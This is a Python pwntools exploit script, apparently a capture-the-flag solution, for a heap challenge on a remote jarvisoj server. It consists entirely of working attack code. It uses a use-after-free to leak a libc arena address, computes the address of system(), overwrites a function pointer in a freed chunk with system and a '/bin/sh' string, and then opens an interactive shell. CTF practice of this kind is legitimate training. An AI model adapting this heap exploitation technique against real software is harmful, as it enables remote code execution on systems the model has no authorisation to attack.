from pwn import *

p=remote('pwn2.jarvisoj.com',9887)

e=ELF('./libc-2.19.so')

def add(name,length,descript):

    p.recvuntil('choose:')

    p.sendline('1')

    p.recvuntil('Item name?')

    p.sendline(name)

    p.recvuntil("Description's len?")

    p.sendline(str(length))

    p.recvuntil('Description?')

    p.sendline(descript)

    p.recvuntil('Add Item Successfully!')

def showitem(index):

    p.recvuntil('choose:')

    p.sendline('3')

    p.recvuntil('Which item?')

    p.sendline(str(index))

def remove(index):

    p.recvuntil('choose:')

    p.sendline('4')

    p.recvuntil('Which item?')

    p.sendline(str(index))

add('A'*30,0x80,'A'*8)

add('B'*30,0x80,'A'*8)

remove(0)

showitem(0)

p.recvuntil('Description:')

arena_addr=u64(p.recv(6).ljust(8,'\x00'))-88

libc_base=arena_addr-0x3be760

system_addr=libc_base+e.symbols['system']

print 'system address: ',hex(system_addr)

remove(1)

add('C'*30,32,'CCCC')

add('D'*30,32,'DDDD')

remove(2)

remove(3)

add('EEEE',24,'/bin/sh;'+'EEEEEEEE'+p64(system_addr))

remove(2)

p.interactive()

